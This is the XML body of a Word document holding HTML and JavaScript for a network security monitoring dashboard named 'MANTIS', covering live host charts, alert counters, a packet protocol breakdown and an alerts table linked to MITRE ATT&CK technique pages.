    <w:p w14:paraId="0A9C0A63" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F47307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Update Graphs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091AF71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(cpuChart &amp;&amp; memChart) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A84CC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cpuChart.data.datasets[0].data.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039D5A6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cpuChart.data.datasets[0].data.push(data.cpu_usage);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A19AA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cpuChart.update('none');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B7AB5A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="613560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memChart.data.datasets[0].data.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C8DE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memChart.data.datasets[0].data.push(data.mem_usage);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D92F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memChart.update('none');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CB26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1398AA99" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D575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Update Engine Hit Counters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321A678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document.getElementById('ddosCount').innerText = data.ddos_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A02A3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document.getElementById('scanCount').innerText = data.scan_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1237D5F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document.getElementById('payloadCount').innerText = data.payload_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031937E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document.getElementById('blacklistCount').innerText = data.blacklist_alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79838A50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="465E0BA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Live traffic telemetry (real, from the sensor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F13E4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document.getElementById('ppsVal').innerText = data.pps;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EE663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zEl = document.getElementById('zVal');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D3DF3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zEl.innerText = data.z_score.toFixed(2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0827F4C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zEl.style.color = data.ddos_active ? 'var(--accent-red)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE6A3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data.ddos_candidate ? 'var(--accent-orange)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E24E9B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'var(--accent-green)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79262FB2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4900BE4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Packet viewer live counters + protocol breakdown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C911C3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pc = data.proto_counts || {};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F3283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document.getElementById('pcTCP').innerText = pc.TCP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5AAA7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document.getElementById('pcUDP').innerText = pc.UDP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4A3A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document.getElementById('pcICMP').innerText = pc.ICMP || 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B6CF3B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7738E7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Render Recent Alerts Table (Overview Page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D15BD8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renderAlerts('alertTableBody', 8);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26153F36" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1826B9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Render All Alerts Table (Alerts Page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A96C9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renderAlerts('fullAlertTableBody', 100);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB83EFE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D55511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Status indicator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D14CF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document.getElementById('statusText').innerText = "System operational";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5272BD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document.getElementById('statusText').style.color = "var(--accent-green)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EC604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document.querySelector('.pulse-dot').style.backgroundColor = "var(--accent-green)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0537167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document.getElementById('lastUpdatedText').innerText =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6642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"Updated " + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47111B56" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="765283F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catch (e) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569E61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console.error("Connection lost", e);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15065E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document.getElementById('statusText').innerText = "Connection unavailable";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305D49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document.getElementById('statusText').style.color = "var(--accent-red)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E716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document.querySelector('.pulse-dot').style.backgroundColor = "var(--accent-red)";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6176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document.getElementById('lastUpdatedText').innerText = "Retrying telemetry";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1D645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59FB83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B6C23EC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EAB092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function renderAlerts(elementId, limit) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728BC15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tbody = document.getElementById(elementId);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7683FC3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tbody.innerHTML = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406FC863" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B6741E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(allAlerts.length === 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6358F1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tbody.innerHTML = `&lt;tr&gt;&lt;td colspan="6" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662CCB8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&lt;strong&gt;No threat events in this session&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F89676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&lt;span&gt;New detections will appear here automatically.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355138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&lt;/td&gt;&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E3360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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329CCE4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4A1B5C2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AC6B00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allAlerts.slice(0, limit).forEach(alert =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035B497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sevClass = alert.severity === 'CRITICAL' ? 'bg-CRITICAL' :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601D528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alert.severity === 'HIGH' ? 'bg-HIGH' :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF42D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alert.message.includes("SCAN") ? 'bg-SCAN' : 'bg-INFO';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3581AE1D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B014D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MITRE ATT&amp;CK enrichment, linked to the public technique page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0BCA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tech = '&lt;span style="color:#475569"&gt;-&lt;/span&gt;';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6CB54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(alert.technique_id &amp;&amp; alert.technique_id !== 'N/A') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54736D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url = 'https://attack.mitre.org/techniques/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2CCE5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alert.technique_id.replace('.', '/') + '/';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F4C84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tech = `&lt;a href="${url}" target="_blank" rel="noopener"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B4428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class="mono" style="color:var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536A179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text-decoration:none"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28185CD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title="${alert.technique || ''} - ${alert.tactic || ''}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AF760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&gt;${alert.technique_id}&lt;/a&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4FF26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512A5DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="677210A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risk = Number(alert.risk_score || 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF6FE1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riskColour = risk &gt;= 8 ? 'var(--accent-red)'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277E7D2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risk &gt;= 5 ? 'var(--accent-orange)' : 'var(--accent-green)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A939E2D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C2804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source = alert.src_ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364F1D9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`${alert.sensor} &lt;span style="color:#475569"&gt;&amp;larr;&lt;/span&gt; ${alert.src_ip}`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142F60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alert.sensor;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A29495" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="102B03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let row = `&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3ACA1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&lt;td&gt;&lt;span class="badge ${sevClass}"&gt;${alert.severity}&lt;/span&gt;&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3368A8A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&lt;td class="mono" style="color:#94a3b8"&gt;${alert.time}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511BF58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&lt;td class="mono" style="color:var(--accent-blue)"&gt;${source}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A604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&lt;td&gt;${tech}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540C08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&lt;td class="mono" style="color:${riskColour}; font-weight:700"&gt;${risk.toFixed(1)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAC0E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&lt;td&gt;${alert.message}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA4A5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&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6EEF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tbody.innerHTML += row;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE8E75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DFEC1E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1618C97" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="765B566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setInterval(fetchStats, 1000);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290E3C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setInterval(fetchPackets, 800);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2241613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window.onload = () =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413B7C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initCharts();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22112A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fetchStats();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079184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fetchPackets();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7497CD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EBD0A2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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353A63A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&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0D415A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4390EB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&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2996CF0F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19922AC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 Sidebar nav --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17809E5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class="sidebar"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C482F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class="logo-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38607E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class="brand-mark" aria-hidden="true"&gt;M&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DE4F2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33901A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&lt;h1&gt;MANTIS&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4F166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class="logo-subtitle"&gt;Network security monitor&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071C54D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64EFEF5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63BD7C4C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="775669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class="nav-menu" role="tablist" aria-label="Dashboard sections"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4917FB3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class="nav-label"&gt;Monitoring&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380DBE8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&lt;button type="button" class="nav-item active" role="tab" aria-selected="true"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0254294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aria-controls="tab-overview" onclick="switchTab('tab-overview')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C12F0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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3651B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&lt;rect x="3" y="3" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEA14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&lt;rect x="14" y="3" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682FBA1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&lt;rect x="14" y="14" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A026FE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&lt;rect x="3" y="14" width="7" height="7"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8BB43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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8D0D1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Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3B78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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667B745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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292BAB0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aria-controls="tab-packets" onclick="switchTab('tab-packets')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4C77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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9B86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&lt;polyline points="22 12 18 12 15 21 9 3 6 12 2 12"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8B5B7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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6940C74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Packet capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752A1A4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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3FF38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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6F8AE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aria-controls="tab-alerts" onclick="switchTab('tab-alerts')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453033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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6542290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&lt;path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362CF4E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&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BBB8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&lt;line x1="12" y1="9" x2="12" y2="13"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA6BE3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&lt;line x1="12" y1="17" x2="12.01" y2="17"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DD54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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060FBA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Threat activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245F6AC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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B90AA9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&lt;button type="button" class="nav-item" role="tab" aria-selected="false"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77ED293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aria-controls="tab-architecture" onclick="switchTab('tab-architecture')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6052EC0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&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6835F3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&lt;path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B8501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&lt;polyline points="14 2 14 8 20 8"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E678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&lt;line x1="16" y1="13" x2="8" y2="13"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119D11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&lt;line x1="16" y1="17" x2="8" y2="17"&gt;&lt;/line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BF679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&lt;polyline points="10 9 9 9 8 9"&gt;&lt;/polyline&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F6E2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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386D7A3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System design</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF6661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&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B6B56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315AFE3A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AD7B29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class="sidebar-session" aria-label="Current monitoring session"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEA20B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class="session-heading"&gt;&lt;span class="session-dot"&gt;&lt;/span&gt;Current session&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F513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class="session-row"&gt;&lt;span&gt;Sensors online&lt;/span&gt;&lt;strong id="sidebarSensorCount"&gt;0&lt;/strong&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEA760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class="session-row"&gt;&lt;span&gt;Packets buffered&lt;/span&gt;&lt;strong id="sidebarPacketCount"&gt;0&lt;/strong&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBEE3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02299F9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11DCC073" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CCFA5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class="main-content"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251349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&lt;header&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7004AA3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class="header-copy"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E02525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&lt;h1 id="headerTitle"&gt;Security overview&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1E08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&lt;p id="headerSubtitle"&gt;Live host health, sensor status and detection activity&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D46A26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09D067D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class="header-status"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2D501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&lt;span class="last-updated" id="lastUpdatedText"&gt;Waiting for telemetry&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346675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class="status-badge" role="status" aria-live="polite"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A8F0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class="pulse-dot"&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412997B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&lt;span id="statusText"&gt;System operational&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AE6C1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0575D76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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D50F2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&lt;/header&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB29C90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2D1AE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 TAB 1: OVERVIEW --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6DDA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id="tab-overview" class="tab-content active" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D66036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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9D586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class="section-heading"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1854C36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06D82B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&lt;h2&gt;System health&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1C7B4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&lt;p&gt;Current resource use and monitoring coverage&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B127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483717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class="refresh-note"&gt;Refreshes every second&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049B9B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60AF471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class="metrics-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F47D72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class="card top-acc-blue"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42161F8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class="card-header" style="justify-content: space-between; align-items: center; display:flex;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C369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&lt;span&gt;Host CPU load&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A067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&lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689EBBE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stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9ABC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&lt;path d="M18 20V10"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4741F7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&lt;path d="M12 20V4"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CE177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&lt;path d="M6 20V14"&gt;&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256850E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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF4B21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1F6106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class="metric-value"&gt;&lt;span id="cpuVal"&gt;0.0&lt;/span&gt;&lt;span class="metric-unit"&gt;%&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
